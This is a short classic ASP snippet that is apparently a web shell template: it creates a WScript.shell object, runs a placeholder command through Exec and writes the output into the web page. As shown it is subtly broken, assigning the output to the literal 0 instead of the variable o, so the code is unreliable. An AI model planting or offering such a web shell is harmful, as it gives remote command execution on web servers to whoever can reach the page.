<%
Set rs = CreateObject("WScript.shell")
Set cmd = rs.Exec("<write cmd code here>")
0 = cmd.StdOut.readall()
response.write(o)
%>
